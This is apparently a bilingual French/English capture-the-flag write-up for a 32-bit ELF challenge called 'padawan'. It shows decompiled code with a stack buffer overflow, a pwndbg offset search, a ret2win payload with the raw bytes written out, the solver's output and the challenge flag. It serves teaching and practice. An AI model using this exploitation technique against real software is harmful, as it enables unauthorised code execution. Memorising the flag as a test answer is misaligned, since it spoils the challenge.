# Padawan

## Write-up FR

Le binaire padawan est un ELF x86, sans stack canary, sans PIE et avec NX activé.

En l'analysant avec Ghidra, on découvre une vulnérabilité de type buffer overflow dans la variable `local_16` de la fonction `func` :
```c
void func(void)

{
  char local_16 [14];
  
  puts("What is your name young padawan?");
  fgets(local_16,0x28,_stdin);
  return;
}
```
De plus, en examinant les autres fonctions du programme, on remarque la présence de la fonction `win` :
```c
void win(int param_1,int param_2)

{
  if ((param_1 == 0x4d2) && (param_2 == 0x162e)) {
    puts("You did it, can you feel the Force ?");
    system("cat ./flag.txt");
  }
  return;
}
```
Il s'agit donc d'un exploit de type `ret2win`, où il faut fournir les bons paramètres lors de l'appel à `win`.

Dans un premier temps, on détermine l'offset nécessaire pour contrôler `eip` :
```bash
pwndbg> b *func+67
Breakpoint 1 at 0x8049252
pwndbg> run < <(echo -en "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A")
...
ESP  0xffffca0c ◂— 'a7Aa8Aa9Ab0Ab1Ab2'
 EIP  0x8049252 (func+67) ◂— ret 
─────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────
 ► 0x8049252 <func+67>    ret                                <0x61413761>
```
On voit alors que l'on contrôle `eip` après avoir débordé de `22` octets.
Ensuite, il nous faut appeler la fonction win avec les bons arguments. En mode x86, l'ordre des arguments est le suivant :

- adresse de retour
- param1
- param2

Ainsi, le payload que l'on enverra est constitué de : 
- a*22
- ret_addr
- 0x4d2
- 0x162e

Ce qui donne le payload suivant : 
```
aaaaaaaaaaaaaaaaaaaaaa\x96\x91\x04\x08BBBB\xd2\x04\x00\x00\x2e\x16\x00\x00
```
```bash
$ python sol.py 
[*]
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to localhost on port 4446: Done
[*] Switching to interactive mode
You did it, can you feel the Force ?
polycyber{y0ung_p@d@w@nn}
[*] Got EOF while reading in interactive
```

## Write-up EN

The padawan binary is an ELF x86, without stack canary, without PIE, and with NX enabled.

When analyzing it with Ghidra, we find a buffer overflow vulnerability in the `local_16` variable of the `func` function :
```c
void func(void)

{
  char local_16 [14];
  
  puts("What is your name young padawan?");
  fgets(local_16, 0x28, _stdin);
  return;
}
```
Additionally, by examining other functions in the program, we notice the presence of the `win` function:
```c
void win(int param_1, int param_2)

{
  if ((param_1 == 0x4d2) && (param_2 == 0x162e)) {
    puts("You did it, can you feel the Force?");
    system("cat ./flag.txt");
  }
  return;
}
```
This is a `ret2win` exploit, where we need to provide the correct parameters when calling `win`.
First, we determine the offset needed to control the `eip` :
```bash
pwndbg> b *func+67
Breakpoint 1 at 0x8049252
pwndbg> run < <(echo -en "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A")
...
ESP  0xffffca0c ◂— 'a7Aa8Aa9Ab0Ab1Ab2'
 EIP  0x8049252 (func+67) ◂— ret 
─────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────
 ► 0x8049252 <func+67>    ret                                <0x61413761>
```
We can see that we control `eip` after overflowing `22` bytes.

Next, we need to call the win function with the correct arguments. In `x86` architecture, the order of the arguments is as follows:
- return address
- param1
- param2
Therefore, the payload we send will consist of :
- a*22
- ret_addr
- 0x4d2
- 0x162e
This gives the following payload :
```
aaaaaaaaaaaaaaaaaaaaaa\x96\x91\x04\x08BBBB\xd2\x04\x00\x00\x2e\x16\x00\x00
```
```bash
$ python sol.py 
[*]
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to localhost on port 4446: Done
[*] Switching to interactive mode
You did it, can you feel the Force ?
polycyber{y0ung_p@d@w@nn}
[*] Got EOF while reading in interactive
```

## Flag

`polycyber{y0ung_p@d@w@nn}`